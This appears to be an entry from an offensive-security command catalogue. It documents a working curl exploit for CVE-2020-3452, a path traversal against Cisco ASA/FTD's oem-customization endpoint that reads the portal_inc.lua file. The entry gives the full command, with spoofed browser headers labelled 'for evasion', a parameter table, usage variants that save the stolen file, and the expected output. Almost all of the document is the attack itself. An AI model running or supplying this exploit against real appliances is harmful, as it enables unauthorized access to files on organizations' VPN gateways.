---
data: >-
  curl -i -s -k -X $'GET' -H $'Host: target.example.com' -H $'User-Agent:
  Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H
  $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H
  $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H
  $'DNT: 1' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1'
  $'https://target.example.com/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua'
tags:
  - http
  - traversal
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:05.588Z'
id: 95f3ed6a-9797-4147-96cd-149357113837
verified: false
validated: true
submitted: true
---
# curl-oem-customization-traversal

## Command

```bash
curl -i -s -k -X $'GET' -H $'Host: target.example.com' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'DNT: 1' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' $'https://target.example.com/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua'
```

## Description

Executes path traversal on the oem-customization endpoint in Cisco ASA/FTD for CVE-2020-3452, using '..' in platform and resource-type to read portal_inc.lua. Ideal for verifying alternative exploitation paths.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-i` | Include response headers | Yes |
| `-s` | Suppress progress output | Yes |
| `-k` | Skip SSL verification | Yes |
| `-H` headers | Browser-like headers for evasion | Yes |
| URL params | app=AnyConnect, platform=.., etc. | Yes |

## Examples

### Basic Usage

```bash
curl -i -s -k ... https://target.example.com/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua
```

### Advanced Usage

With output to file: ```bash
curl ... > portal_inc.lua
```

## Expected Output

HTTP/1.1 200 OK\nContent-Type: application/octet-stream\n\n[Lua code, e.g., dofile('/+CSCOE+/include/common.lua')]

## Related

- [[commands/curl-translation-table-traversal]]
- [[procedures/Exploit-OEM-Customization-Path-Traversal]]
